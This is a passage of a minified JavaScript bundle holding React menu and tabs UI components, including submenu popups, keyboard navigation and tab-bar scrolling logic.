oF({prefixCls:e,visible:t,children:r,popup:o,popupStyle:n,popupClassName:a,popupOffset:s,disabled:c,mode:u,onVisibleChange:d}){let{getPopupContainer:p,rtl:m,subMenuOpenDelay:f,subMenuCloseDelay:g,builtinPlacements:h,triggerSubMenuAction:v,forceSubMenuRender:b,rootClassName:y,motion:S,defaultMotions:x}=i.useContext(r4),[C,w]=i.useState(!1),k=m?{...o_,...h}:{...oL,...h},P=oj[u],$=oO(u,S,x),E=i.useRef($);"inline"!==u&&(E.current=$);let T={...E.current,leavedClassName:`${e}-hidden`,removeOnLeave:!1,motionAppear:!0},I=i.useRef();return i.useEffect(()=>(I.current=(0,eJ.default)(()=>{w(t)}),()=>{eJ.default.cancel(I.current)}),[t]),i.createElement(r_,{prefixCls:e,popupClassName:(0,l.clsx)(`${e}-popup`,{[`${e}-rtl`]:m},a,y),stretch:"horizontal"===u?"minWidth":null,getPopupContainer:p,builtinPlacements:k,popupPlacement:P,popupVisible:C,popup:o,popupStyle:n,popupAlign:s&&{offset:s},action:c?[]:[v],mouseEnterDelay:f,mouseLeaveDelay:g,onPopupVisibleChange:d,forceRender:b,popupMotion:T,fresh:!0},r)}function oN(){return(oN=Object.assign.bind()).apply(this,arguments)}function oV({id:e,open:t,keyPath:r,children:o}){let n="inline",{prefixCls:a,forceSubMenuRender:s,motion:l,defaultMotions:c,mode:u}=i.useContext(r4),d=i.useRef(!1);d.current=u===n;let[p,m]=i.useState(!d.current),f=!!d.current&&t;i.useEffect(()=>{d.current&&m(!1)},[u]);let g={...oO(n,l,c)};r.length>1&&(g.motionAppear=!1);let h=g.onVisibleChanged;return(g.onVisibleChanged=e=>(d.current||e||m(!0),h?.(e)),p)?null:i.createElement(r6,{mode:n,locked:!d.current},i.createElement(rs.default,oN({visible:f},g,{forceRender:s,removeOnLeave:!1,leavedClassName:`${a}-hidden`}),({className:t,style:r})=>i.createElement(oM,{id:e,className:t,style:r},o)))}function oB(){return(oB=Object.assign.bind()).apply(this,arguments)}let oH=i.forwardRef((e,t)=>{let{style:r,className:o,styles:n,classNames:a,title:s,eventKey:c,warnKey:u,disabled:d,internalPopupClose:p,children:m,itemIcon:f,expandIcon:g,popupClassName:h,popupOffset:v,popupStyle:b,onClick:y,onMouseEnter:S,onMouseLeave:x,onTitleClick:C,onTitleMouseEnter:w,onTitleMouseLeave:k,popupRender:P,...$}=e,E=r2(c),{prefixCls:T,mode:I,openKeys:R,disabled:M,overflowDisabled:A,activeKey:D,selectedKeys:L,itemIcon:_,expandIcon:O,onItemClick:j,onOpenChange:F,onActive:N,popupRender:V}=i.useContext(r4),{_internalRenderSubMenuItem:B}=i.useContext(ot),{isSubPathKey:H}=i.useContext(oe),z=r9(),U=`${T}-submenu`,W=M||d,q=i.useRef(),G=i.useRef(),J=g??O,X=R.includes(c),K=!A&&X,Q=H(L,c),{active:Y,...Z}=oC(c,W,w,k),[ee,et]=i.useState(!1),er=e=>{W||et(e)},eo=i.useMemo(()=>Y||"inline"!==I&&(ee||H([D],c)),[I,Y,D,ee,c,H]),en=ow(z.length),ea=oy(e=>{y?.(oP(e)),j(e)}),ei=E&&`${E}-popup`,es=i.useMemo(()=>i.createElement(ok,{icon:"horizontal"!==I?J:void 0,props:{...e,isOpen:K,isSubMenu:!0}},i.createElement("i",{className:`${U}-arrow`})),[I,J,e,K,U]),el=i.createElement("div",oB({role:"menuitem",style:en,className:`${U}-title`,tabIndex:W?null:-1,ref:q,title:"string"==typeof s?s:null,"data-menu-id":A&&E?null:E,"aria-expanded":K,"aria-haspopup":!0,"aria-controls":ei,"aria-disabled":W,onClick:e=>{W||(C?.({key:c,domEvent:e}),"inline"===I&&F(c,!X))},onFocus:()=>{N(c)}},Z),s,es),ec=i.useRef(I);"inline"!==I&&z.length>1?ec.current="vertical":ec.current=I;let eu=ec.current,ed=i.useMemo(()=>{let t=i.createElement(r6,{classNames:a,styles:n,mode:"horizontal"===eu?"vertical":eu},i.createElement(oM,{id:ei,ref:G},m)),r=P||V;return r?r(t,{item:e,keys:z}):t},[P,V,z,ei,m,e,eu]);if(!A){let e=ec.current;el=i.createElement(oF,{mode:e,prefixCls:U,visible:!p&&K&&"inline"!==I,popupClassName:h,popupOffset:v,popupStyle:b,popup:ed,disabled:W,onVisibleChange:e=>{"inline"!==I&&F(c,e)}},el)}let ep=i.createElement(r0.Item,oB({ref:t,role:"none"},$,{component:"li",style:r,className:(0,l.clsx)(U,`${U}-${I}`,o,{[`${U}-open`]:K,[`${U}-active`]:eo,[`${U}-selected`]:Q,[`${U}-disabled`]:W}),onMouseEnter:e=>{er(!0),S?.({key:c,domEvent:e})},onMouseLeave:e=>{er(!1),x?.({key:c,domEvent:e})}}),el,!A&&i.createElement(oV,{id:ei,open:K,keyPath:z},m));return B&&(ep=B(ep,e,{selected:Q,active:eo,open:K,disabled:W})),i.createElement(r6,{classNames:a,styles:n,onItemClick:ea,mode:"horizontal"===I?"vertical":I,itemIcon:f??_,expandIcon:J},ep)}),oz=i.forwardRef((e,t)=>{let r,{eventKey:o,children:n}=e,a=r9(o),s=oA(n,a),l=r8();return i.useEffect(()=>{if(l)return l.registerPath(o,a),()=>{l.unregisterPath(o,a)}},[a]),r=l?s:i.createElement(oH,oB({ref:t},e),s),i.createElement(r7.Provider,{value:a},r)});function oU({className:e,style:t}){let{prefixCls:r}=i.useContext(r4);return r8()?null:i.createElement("li",{role:"separator",className:(0,l.clsx)(`${r}-item-divider`,e),style:t})}function oW(){return(oW=Object.assign.bind()).apply(this,arguments)}e.s(["default",0,oz],4079),e.s(["default",()=>oU],50211);let oq=i.forwardRef((e,t)=>{let{className:r,title:o,eventKey:n,children:a,...s}=e,{prefixCls:c,classNames:u,styles:d}=i.useContext(r4),p=`${c}-item-group`;return i.createElement("li",oW({ref:t,role:"presentation"},s,{onClick:e=>e.stopPropagation(),className:(0,l.clsx)(p,r)}),i.createElement("div",{role:"presentation",className:(0,l.clsx)(`${p}-title`,u?.listTitle),style:d?.listTitle,title:"string"==typeof o?o:void 0},o),i.createElement("ul",{role:"group",className:(0,l.clsx)(`${p}-list`,u?.list),style:d?.list},a))}),oG=i.forwardRef((e,t)=>{let{eventKey:r,children:o}=e,n=oA(o,r9(r));return r8()?n:i.createElement(oq,oW({ref:t},(0,oS.default)(e,["warnKey"])),n)});function oJ(){return(oJ=Object.assign.bind()).apply(this,arguments)}function oX(e,t,r,o,n){let a=e,s={divider:oU,item:oI,group:oG,submenu:oz,...o};return t&&(a=function e(t,r,o){let{item:n,group:a,submenu:s,divider:l}=r;return(t||[]).map((t,c)=>{if(t&&"object"==typeof t){let{label:u,children:d,key:p,type:m,extra:f,...g}=t,h=p??`tmp-${c}`;return d||"group"===m?"group"===m?i.createElement(a,oJ({key:h},g,{title:u}),e(d,r,o)):i.createElement(s,oJ({key:h},g,{title:u}),e(d,r,o)):"divider"===m?i.createElement(l,oJ({key:h},g)):i.createElement(n,oJ({key:h},g,{extra:f}),u,(!!f||0===f)&&i.createElement("span",{className:`${o}-item-extra`},f))}return null}).filter(e=>e)}(t,s,n)),oA(a,r)}function oK(){return(oK=Object.assign.bind()).apply(this,arguments)}e.s(["default",0,oG],33578);let oQ=[],oY=i.forwardRef((e,t)=>{var r;let o,n,a,{prefixCls:s="rc-menu",rootClassName:c,style:u,className:d,styles:p,classNames:m,tabIndex:f=0,items:g,children:h,direction:v,id:b,mode:y="vertical",inlineCollapsed:S,disabled:x,disabledOverflow:C,subMenuOpenDelay:w=.1,subMenuCloseDelay:k=.1,forceSubMenuRender:P,defaultOpenKeys:$,openKeys:E,activeKey:T,defaultActiveFirst:I,selectable:R=!0,multiple:M=!1,defaultSelectedKeys:A,selectedKeys:D,onSelect:L,onDeselect:_,inlineIndent:O=24,motion:j,defaultMotions:F,triggerSubMenuAction:N="hover",builtinPlacements:B,itemIcon:H,expandIcon:z,overflowedIndicator:U="...",overflowedIndicatorPopupClassName:W,getPopupContainer:q,onClick:G,onOpenChange:J,onKeyDown:X,openAnimation:K,openTransitionName:Q,_internalRenderMenuItem:Y,_internalRenderSubMenuItem:Z,_internalComponents:ee,popupRender:et,...er}=e,[eo,en]=i.useMemo(()=>[oX(h,g,oQ,ee,s),oX(h,g,oQ,{},s)],[h,g,ee]),[ea,ei]=i.useState(!1),es=i.useRef(),el=t9(b?`rc-menu-uuid-${b}`:"rc-menu-uuid"),ec="rtl"===v,[eu,ed]=(0,tR.default)($,E),ep=eu||oQ,em=(e,t=!1)=>{function r(){ed(e),J?.(e)}t?(0,t1.flushSync)(r):r()},[ef,eg]=i.useState(ep),eh=i.useRef(!1),[ev,eb]=i.useMemo(()=>("inline"===y||"vertical"===y)&&S?["vertical",S]:[y,!1],[y,S]),ey="inline"===ev,[eS,ex]=i.useState(ev),[eC,ew]=i.useState(eb);i.useEffect(()=>{ex(ev),ew(eb),eh.current&&(ey?ed(ef):em(oQ))},[ev,eb]);let[ek,eP]=i.useState(0),e$=ek>=eo.length-1||"horizontal"!==eS||C;i.useEffect(()=>{ey&&eg(ep)},[ep]),i.useEffect(()=>(eh.current=!0,()=>{eh.current=!1}),[]);let{registerPath:eE,unregisterPath:eT,refreshOverflowKeys:eI,isSubPathKey:eR,getKeyPath:eM,getKeys:eA,getSubPathKeys:eD}=function(){let[,e]=i.useState({}),t=(0,i.useRef)(new Map),r=(0,i.useRef)(new Map),[o,n]=i.useState([]),a=(0,i.useRef)(0),s=(0,i.useRef)(!1),l=(0,i.useCallback)((o,n)=>{let i=n.join(ov);r.current.set(i,o),t.current.set(o,i),a.current+=1;let l=a.current;Promise.resolve().then(()=>{l===a.current&&(s.current||e({}))})},[]),c=(0,i.useCallback)((e,o)=>{let n=o.join(ov);r.current.delete(n),t.current.delete(e)},[]),u=(0,i.useCallback)(e=>{n(e)},[]),d=(0,i.useCallback)((e,r)=>{let n=(t.current.get(e)||"").split(ov);return r&&o.includes(n[0])&&n.unshift(ob),n},[o]),p=(0,i.useCallback)((e,t)=>e.filter(e=>void 0!==e).some(e=>d(e,!0).includes(t)),[d]),m=(0,i.useCallback)(e=>{let o=`${t.current.get(e)}${ov}`,n=new Set;return[...r.current.keys()].forEach(e=>{e.startsWith(o)&&n.add(r.current.get(e))}),n},[]);return i.useEffect(()=>()=>{s.current=!0},[]),{registerPath:l,unregisterPath:c,refreshOverflowKeys:u,isSubPathKey:p,getKeyPath:d,getKeys:()=>{let e=[...t.current.keys()];return o.length&&e.push(ob),e},getSubPathKeys:m}}(),eL=i.useMemo(()=>({registerPath:eE,unregisterPath:eT}),[eE,eT]),e_=i.useMemo(()=>({isSubPathKey:eR}),[eR]);i.useEffect(()=>{eI(e$?oQ:eo.slice(ek+1).map(e=>e.key))},[ek,e$]);let[eO,ej]=(0,tR.default)(T||I&&eo[0]?.key,T),eF=oy(e=>{ej(e)}),eN=oy(()=>{ej(void 0)});(0,i.useImperativeHandle)(t,()=>({list:es.current,focus:e=>{let t,r=eA(),{elements:o,key2element:n,element2key:a}=oh(r,el),i=of(es.current,o);t=eO&&r.includes(eO)?eO:i[0]?a.get(i[0]):eo.find(e=>!e.props.disabled)?.key;let s=n.get(t);t&&s&&s?.focus?.(e)},findItem:({key:e})=>{let{key2element:t}=oh(eA(),el);return t.get(e)||null}}));let[eV,eB]=(0,tR.default)(A||[],D),eH=i.useMemo(()=>Array.isArray(eV)?eV:null==eV?oQ:[eV],[eV]),ez=oy(e=>{G?.(oP(e)),(e=>{if(R){let t,{key:r}=e,o=eH.includes(r);eB(t=M?o?eH.filter(e=>e!==r):[...eH,r]:[r]);let n={...e,selectedKeys:t};o?_?.(n):L?.(n)}!M&&ep.length&&"inline"!==eS&&em(oQ)})(e)}),eU=oy((e,t)=>{let r=ep.filter(t=>t!==e);if(t)r.push(e);else if("inline"!==eS){let t=eD(e);r=r.filter(e=>!t.has(e))}(0,V.default)(ep,r,!0)||em(r,!0)}),eW=(r=(e,t)=>{let r=t??!ep.includes(e);eU(e,r)},o=i.useRef(),(n=i.useRef()).current=eO,a=()=>{eJ.default.cancel(o.current)},i.useEffect(()=>()=>{a()},[]),e=>{let{which:t}=e;if([...om,oc,ou,od,op].includes(t)){let i=eA(),s=oh(i,el),{elements:l,key2element:c,element2key:u}=s,d=function(e,t){let r=e||document.activeElement;for(;r;){if(t.has(r))return r;r=r.parentElement}return null}(c.get(eO),l),p=u.get(d),m=function(e,t,r,o){let n="prev",a="next",i="children",s="parent";if("inline"===e&&o===oc)return{inlineTrigger:!0};let l={[os]:n,[ol]:a},c={[os]:n,[ol]:a,[oc]:i,[ou]:s,[oa]:r?i:s,[oi]:r?s:i};switch(({inline:l,horizontal:{[oa]:r?a:n,[oi]:r?n:a,[ol]:i,[oc]:i},vertical:c,inlineSub:l,horizontalSub:c,verticalSub:c})[`${e}${t?"":"Sub"}`]?.[o]){case n:return{offset:-1,sibling:!0};case a:return{offset:1,sibling:!0};case s:return{offset:-1,sibling:!1};case i:return{offset:1,sibling:!1};default:return null}}(eS,1===eM(p,!0).length,ec,t);if(!m&&t!==od&&t!==op)return;(om.includes(t)||[od,op].includes(t))&&e.preventDefault();let f=e=>{if(e){let t=e,r=e.querySelector("a");r?.getAttribute("href")&&(t=r);let i=u.get(e);ej(i),a(),o.current=(0,eJ.default)(()=>{n.current===i&&t.focus()})}};if([od,op].includes(t)||m.sibling||!d){let e,r=of(e=d&&"inline"!==eS?function(e){let t=e;for(;t;){if(t.getAttribute("data-menu-list"))return t;t=t.parentElement}return null}(d):es.current,l);f(t===od?r[0]:t===op?r[r.length-1]:og(e,l,d,m.offset))}else if(m.inlineTrigger)r(p);else if(m.offset>0)r(p,!0),a(),o.current=(0,eJ.default)(()=>{s=oh(i,el);let e=d.getAttribute("aria-controls");f(og(document.getElementById(e),s.elements))},5);else if(m.offset<0){let e=eM(p,!0),t=e[e.length-2],o=c.get(t);r(t,!1),f(o)}}X?.(e)});i.useEffect(()=>{ei(!0)},[]);let eq=i.useMemo(()=>({_internalRenderMenuItem:Y,_internalRenderSubMenuItem:Z}),[Y,Z]),eG="horizontal"!==eS||C?eo:eo.map((e,t)=>i.createElement(r6,{key:e.key,overflowDisabled:t>ek,classNames:m,styles:p},e)),eX=i.createElement(r0,oK({id:b,ref:es,prefixCls:`${s}-overflow`,component:"ul",itemComponent:oI,className:(0,l.clsx)(s,`${s}-root`,`${s}-${eS}`,d,{[`${s}-inline-collapsed`]:eC,[`${s}-rtl`]:ec},c),dir:v,style:u,role:"menu",tabIndex:f,data:eG,renderRawItem:e=>e,renderRawRest:e=>{let t=e.length,r=t?eo.slice(-t):null;return i.createElement(oz,{eventKey:ob,title:U,disabled:e$,internalPopupClose:0===t,popupClassName:W},r)},maxCount:"horizontal"!==eS||C?r0.INVALIDATE:r0.RESPONSIVE,ssr:"full","data-menu-list":!0,onVisibleChange:e=>{eP(e)},onKeyDown:eW},er));return i.createElement(ot.Provider,{value:eq},i.createElement(r1.Provider,{value:el},i.createElement(r6,{prefixCls:s,rootClassName:c,classNames:m,styles:p,mode:eS,openKeys:ep,rtl:ec,disabled:x,motion:ea?j:null,defaultMotions:ea?F:null,activeKey:eO,onActive:eF,onInactive:eN,selectedKeys:eH,inlineIndent:O,subMenuOpenDelay:w,subMenuCloseDelay:k,forceSubMenuRender:P,builtinPlacements:B,triggerSubMenuAction:N,getPopupContainer:q,itemIcon:H,expandIcon:z,onItemClick:ez,onOpenChange:eU,popupRender:et},i.createElement(oe.Provider,{value:e_},eX),i.createElement("div",{style:{display:"none"},"aria-hidden":!0},i.createElement(r5.Provider,{value:eL},en)))))});function oZ(){return(oZ=Object.assign.bind()).apply(this,arguments)}oY.Item=oI,oY.SubMenu=oz,oY.ItemGroup=oG,oY.Divider=oU,e.s(["default",0,oY],13381);let o0=i.forwardRef((e,t)=>{let{prefixCls:r,id:o,tabs:n,locale:a,mobile:s,more:c={},style:u,className:d,editable:p,tabBarGutter:m,rtl:f,removeAriaLabel:g,onTabClick:h,getPopupContainer:v,popupClassName:b,popupStyle:y}=e,[S,x]=(0,i.useState)(!1),[C,w]=(0,i.useState)(null),{icon:k="More"}=c,P=`${o}-more-popup`,$=`${r}-dropdown`,E=null!==C?`${P}-${C}`:null,T=a?.dropdownAriaLabel,I=i.createElement(oY,{onClick:({key:e,domEvent:t})=>{h(e,t),x(!1)},prefixCls:`${$}-menu`,id:P,tabIndex:-1,role:"listbox","aria-activedescendant":E,selectedKeys:[C],"aria-label":void 0!==T?T:"expanded dropdown"},n.map(e=>{let{closable:t,disabled:r,closeIcon:n,key:a,label:s}=e,l=tQ(t,n,p,r);return i.createElement(oI,{key:a,id:`${P}-${a}`,role:"option","aria-controls":o&&`${o}-panel-${a}`,disabled:r},i.createElement("span",null,s),l&&i.createElement("button",{type:"button","aria-label":g||"remove",tabIndex:0,className:`${$}-menu-item-remove`,onClick:e=>{e.stopPropagation(),e.preventDefault(),e.stopPropagation(),p.onEdit("remove",{key:a,event:e})}},n||p.removeIcon||"×"))}));function R(e){let t=n.filter(e=>!e.disabled),r=t.findIndex(e=>e.key===C)||0,o=t.length;for(let n=0;n<o;n+=1){let n=t[r=(r+e+o)%o];if(!n.disabled)return void w(n.key)}}(0,i.useEffect)(()=>{let e=document.getElementById(E);e?.scrollIntoView&&e.scrollIntoView(!1)},[E,C]),(0,i.useEffect)(()=>{S||w(null)},[S]);let M={marginInlineStart:m};n.length||(M.visibility="hidden",M.order=1);let A=(0,l.clsx)(b,{[`${$}-rtl`]:f}),D=s?null:i.createElement(rU,oZ({prefixCls:$,overlay:I,visible:!!n.length&&S,onVisibleChange:x,overlayClassName:A,overlayStyle:y,mouseEnterDelay:.1,mouseLeaveDelay:.1,getPopupContainer:v},c),i.createElement("button",{type:"button",className:`${r}-nav-more`,style:M,"aria-haspopup":"listbox","aria-controls":P,id:`${o}-more`,"aria-expanded":S,onKeyDown:function(e){let{which:t}=e;if(!S){[rO.default.DOWN,rO.default.SPACE,rO.default.ENTER].includes(t)&&(x(!0),e.preventDefault());return}switch(t){case rO.default.UP:R(-1),e.preventDefault();break;case rO.default.DOWN:R(1),e.preventDefault();break;case rO.default.ESC:x(!1);break;case rO.default.SPACE:case rO.default.ENTER:null!==C&&h(C,e)}}},k));return i.createElement("div",{className:(0,l.clsx)(`${r}-nav-operations`,d),style:u,ref:t},D,i.createElement(tY,{prefixCls:r,locale:a,editable:p}))}),o1=i.memo(o0,(e,t)=>t.tabMoving),o2=e=>{let{prefixCls:t,id:r,active:o,focus:n,tab:{key:a,label:s,disabled:c,closeIcon:u,icon:d},closable:p,renderWrapper:m,removeAriaLabel:f,editable:g,onClick:h,onFocus:v,onBlur:b,onKeyDown:y,onMouseDown:S,onMouseUp:x,style:C,className:w,tabCount:k,currentPosition:P}=e,$=`${t}-tab`,E=tQ(p,u,g,c);function T(e){c||h(e)}let I=i.useMemo(()=>d&&"string"==typeof s?i.createElement("span",null,s):s,[s,d]),R=i.useRef(null);i.useEffect(()=>{n&&R.current&&R.current.focus()},[n]);let M=i.createElement("div",{key:a,"data-node-key":tK(a),className:(0,l.clsx)($,w,{[`${$}-with-remove`]:E,[`${$}-active`]:o,[`${$}-disabled`]:c,[`${$}-focus`]:n}),style:C,onClick:T},i.createElement("div",{ref:R,role:"tab","aria-selected":o,id:r&&`${r}-tab-${a}`,className:`${$}-btn`,"aria-controls":r&&`${r}-panel-${a}`,"aria-disabled":c,tabIndex:c?null:o?0:-1,onClick:e=>{e.stopPropagation(),T(e)},onKeyDown:y,onMouseDown:S,onMouseUp:x,onFocus:v,onBlur:b},n&&i.createElement("div",{"aria-live":"polite",style:{width:0,height:0,position:"absolute",overflow:"hidden",opacity:0}},`Tab ${P} of ${k}`),d&&i.createElement("span",{className:`${$}-icon`},d),s&&I),E&&i.createElement("button",{type:"button","aria-label":f||"remove",tabIndex:o?0:-1,className:`${$}-remove`,onClick:e=>{e.stopPropagation(),e.preventDefault(),e.stopPropagation(),g.onEdit("remove",{key:a,event:e})}},u||g.removeIcon||"×"));return m?m(M):M};function o3(){return(o3=Object.assign.bind()).apply(this,arguments)}let o4=e=>{let{offsetWidth:t=0,offsetHeight:r=0}=e.current||{};if(e.current){let{width:r,height:o}=e.current.getBoundingClientRect();if(1>Math.abs(r-t))return[r,o]}return[t,r]},o6=(e,t)=>e[+!t],o5=i.forwardRef((e,t)=>{var r;let o,n,a,s,{className:c,style:u,id:d,animated:p,activeKey:m,rtl:f,extra:g,editable:h,locale:v,tabPosition:b,tabBarGutter:y,children:S,onTabClick:x,onTabScroll:C,indicator:w,classNames:k,styles:P}=e,{prefixCls:$,tabs:E}=i.useContext(tA),T=(0,i.useRef)(null),I=(0,i.useRef)(null),R=(0,i.useRef)(null),M=(0,i.useRef)(null),A=(0,i.useRef)(null),D=(0,i.useRef)(null),L=(0,i.useRef)(null),_="top"===b||"bottom"===b,[O,j]=tW(0,(e,t)=>{_&&C&&C({direction:e>t?"left":"right"})}),[F,N]=tW(0,(e,t)=>{!_&&C&&C({direction:e>t?"top":"bottom"})}),[V,B]=(0,i.useState)([0,0]),[H,z]=(0,i.useState)([0,0]),[U,W]=(0,i.useState)([0,0]),[q,G]=(0,i.useState)([0,0]),[J,X]=function(e){let t=(0,i.useRef)([]),[,r]=(0,i.useState)({}),o=(0,i.useRef)("function"==typeof e?e():e),n=tG(()=>{let e=o.current;t.current.forEach(t=>{e=t(e)}),t.current=[],o.current=e,r({})});return[o.current,function(e){t.current.push(e),n()}]}(new Map),K=(r=H[0],(0,i.useMemo)(()=>{let e=new Map,t=J.get(E[0]?.key)||tU,r=t.left+t.width;for(let t=0;t<E.length;t+=1){let{key:o}=E[t],n=J.get(o);n||(n=J.get(E[t-1]?.key)||tU);let a=e.get(o)||{...n};a.right=r-a.left-a.width,e.set(o,a)}return e},[E.map(e=>e.key).join("_"),J,r])),Q=o6(V,_),Y=o6(H,_),Z=o6(U,_),ee=o6(q,_),et=Math.floor(Q)<Math.floor(Y+Z),er=et?Q-ee:Q-Z,eo=`${$}-nav-operations-hidden`,en=0,ea=0;function ei(e){return e<en?en:e>ea?ea:e}_&&f?(en=0,ea=Math.max(0,Y-er)):(en=Math.min(0,er-Y),ea=0);let es=(0,i.useRef)(null),[el,ec]=(0,i.useState)();function eu(){ec(Date.now())}function ed(){es.current&&clearTimeout(es.current)}!function(e,t){let[r,o]=(0,i.useState)(),[n,a]=(0,i.useState)(0),[s,l]=(0,i.useState)(0),[c,u]=(0,i.useState)(),d=(0,i.useRef)(),p=(0,i.useRef)(),m=(0,i.useRef)(null);m.current={onTouchStart:function(e){let{screenX:t,screenY:r}=e.touches[0];o({x:t,y:r}),window.clearInterval(d.current)},onTouchMove:function(e){if(!r)return;let{screenX:i,screenY:s}=e.touches[0];o({x:i,y:s});let c=i-r.x,d=s-r.y;t(c,d);let p=Date.now();a(p),l(p-n),u({x:c,y:d})},onTouchEnd:function(){if(r&&(o(null),u(null),c)){let e=c.x/s,r=c.y/s;if(.1>Math.max(Math.abs(e),Math.abs(r)))return;let o=e,n=r;d.current=window.setInterval(()=>{.01>Math.abs(o)&&.01>Math.abs(n)?window.clearInterval(d.current):(o*=.9046104802746175,n*=.9046104802746175,t(20*o,20*n))},20)}},onWheel:function(e){let{deltaX:r,deltaY:o}=e,n=0,a=Math.abs(r),i=Math.abs(o);a===i?n="x"===p.current?r:o:a>i?(n=r,p.current="x"):(n=o,p.current="y"),t(-n,-n)&&e.preventDefault()}},i.useEffect(()=>{function t(e){m.current.onTouchMove(e)}function r(e){m.current.onTouchEnd(e)}return document.addEventListener("touchmove",t,{passive:!1}),document.addEventListener("touchend",r,{passive:!0}),e.current.addEventListener("touchstart",function(e){m.current.onTouchStart(e)},{passive:!0}),e.current.addEventListener("wheel",function(e){m.current.onWheel(e)},{passive:!1}),()=>{document.removeEventListener("touchmove",t),document.removeEventListener("touchend",r)}},[])}(M,(e,t)=>{var r,o,n,a;return!!et&&(_?(r=j,o=e,r(e=>ei(e+o))):(n=N,a=t,n(e=>ei(e+a))),ed(),eu(),!0)}),(0,i.useEffect)(()=>(ed(),el&&(es.current=setTimeout(()=>{ec(0)},100)),ed),[el]);let[ep,em]=function(e,t,r,o,n,a,{tabs:s,tabPosition:l,rtl:c}){let u,d,p;return["top","bottom"].includes(l)?(u="width",d=c?"right":"left",p=Math.abs(r)):(u="height",d="top",p=-r),(0,i.useMemo)(()=>{if(!s.length)return[0,0];let r=s.length,o=r;for(let n=0;n<r;n+=1){let r=e.get(s[n].key)||tJ;if(Math.floor(r[d]+r[u])>Math.floor(p+t)){o=n-1;break}}let n=0;for(let t=r-1;t>=0;t-=1)if((e.get(s[t].key)||tJ)[d]<p){n=t+1;break}return n>o?[0,-1]:[n,o]},[e,t,o,n,a,p,l,s.map(e=>e.key).join("_"),c])}(K,er,_?O:F,Y,Z,ee,{...e,tabs:E}),ef=(0,tz.default)((e=m)=>{let t=K.get(e)||{width:0,height:0,left:0,right:0,top:0};if(_){let e=O;f?t.right<O?e=t.right:t.right+t.width>O+er&&(e=t.right+t.width-er):t.left<-O?e=-t.left:t.left+t.width>-O+er&&(e=-(t.left+t.width-er)),N(0),j(ei(e))}else{let e=F;t.top<-F?e=-t.top:t.top+t.height>-F+er&&(e=-(t.top+t.height-er)),j(0),N(ei(e))}}),[eg,eh]=(0,i.useState)(),[ev,eb]=(0,i.useState)(!1),ey=E.filter(e=>!e.disabled).map(e=>e.key),eS=e=>{let t=ey.indexOf(eg||m),r=ey.length;eh(ey[(t+e+r)%r])},ex=(e,t)=>{let r=ey.indexOf(e),o=E.find(t=>t.key===e);tQ(o?.closable,o?.closeIcon,h,o?.disabled)&&(t.preventDefault(),t.stopPropagation(),h.onEdit("remove",{key:e,event:t}),r===ey.length-1?eS(-1):eS(1))},eC=e=>{let{code:t}=e,r=f&&_,o=ey[0],n=ey[ey.length-1];switch(t){case"ArrowLeft":_&&eS(r?1:-1);break;case"ArrowRight":_&&eS(r?-1:1);break;case"ArrowUp":e.preventDefault(),_||eS(-1);break;case"ArrowDown":e.preventDefault(),_||eS(1);break;case"Home":e.preventDefault(),eh(o);break;case"End":e.preventDefault(),eh(n);break;case"Enter":case"Space":e.preventDefault(),x(eg??m,e);break;case"Backspace":case"Delete":ex(eg,e)}},ew={};_?ew.marginInlineStart=y:ew.marginTop=y;let ek=E.map((e,t)=>{let{key:r}=e;return i.createElement(o2,{id:d,prefixCls:$,key:r,tab:e,className:k?.item,style:0===t?P?.item:{...ew,...P?.item},closable:e.closable,editable:h,active:r===m,focus:r===eg,renderWrapper:S,removeAriaLabel:v?.removeAriaLabel,tabCount:ey.length,currentPosition:t+1,onClick:e=>{x(r,e)},onKeyDown:eC,onFocus:()=>{ev||eh(r),ef(r),eu(),M.current&&(f||(M.current.scrollLeft=0),M.current.scrollTop=0)},onBlur:()=>{eh(void 0)},onMouseDown:e=>{eb(!0),1===e.button&&ex(r,e)},onMouseUp:()=>{eb(!1)}})}),eP=()=>X(()=>{let e=new Map,t=A.current?.getBoundingClientRect();return E.forEach(({key:r})=>{let o=A.current?.querySelector(`[data-node-key="${tK(r)}"]`);if(o){let[n,a,i,s]=((e,t)=>{let{offsetWidth:r,offsetHeight:o,offsetTop:n,offsetLeft:a}=e,{width:i,height:s,left:l,top:c}=e.getBoundingClientRect();return 1>Math.abs(i-r)?[i,s,l-t.left,c-t.top]:[r,o,a,n]})(o,t);e.set(r,{width:n,height:a,left:i,top:s})}}),e});(0,i.useEffect)(()=>{eP()},[E.map(e=>e.key).join("_")]);let e$=tG(()=>{let e=o4(T),t=o4(I),r=o4(R);B([e[0]-t[0]-r[0],e[1]-t[1]-r[1]]);let o=o4(L);W(o),G(o4(D));let n=o4(A);z([n[0]-o[0],n[1]-o[1]]),eP()}),eE=[...E.slice(0,ep),...E.slice(em+1)],eT=K.get(m),{style:eI}=(e=>{let{activeTabOffset:t,horizontal:r,rtl:o,indicator:n={}}=e,{size:a,align:s="center"}=n,[l,c]=(0,i.useState)(),u=(0,i.useRef)(),d=i.default.useCallback(e=>"function"==typeof a?a(e):"number"==typeof a?a:e,[a]);function p(){eJ.default.cancel(u.current)}return(0,i.useEffect)(()=>{let e={};if(t)if(r){e.width=d(t.width);let r=o?"right":"left";"start"===s&&(e[r]=t[r]),"center"===s&&(e[r]=t[r]+t.width/2,e.transform=o?"translateX(50%)":"translateX(-50%)"),"end"===s&&(e[r]=t[r]+t.width,e.transform="translateX(-100%)")}else e.height=d(t.height),"start"===s&&(e.top=t.top),"center"===s&&(e.top=t.top+t.height/2,e.transform="translateY(-50%)"),"end"===s&&(e.top=t.top+t.height,e.transform="translateY(-100%)");return p(),u.current=(0,eJ.default)(()=>{l&&e&&Object.keys(e).every(t=>{let r=e[t],o=l[t];return"number"==typeof r&&"number"==typeof o?Math.round(r)===Math.round(o):r===o})||c(e)}),p},[JSON.stringify(t),r,o,s,d]),{style:l}})({activeTabOffset:eT,horizontal:_,indicator:w,rtl:f});(0,i.useEffect)(()=>{ef()},[m,en,ea,tX(eT),tX(K),_]),(0,i.useEffect)(()=>{e$()},[f]);let eR=!!eE.length,eM=`${$}-nav-wrap`;return 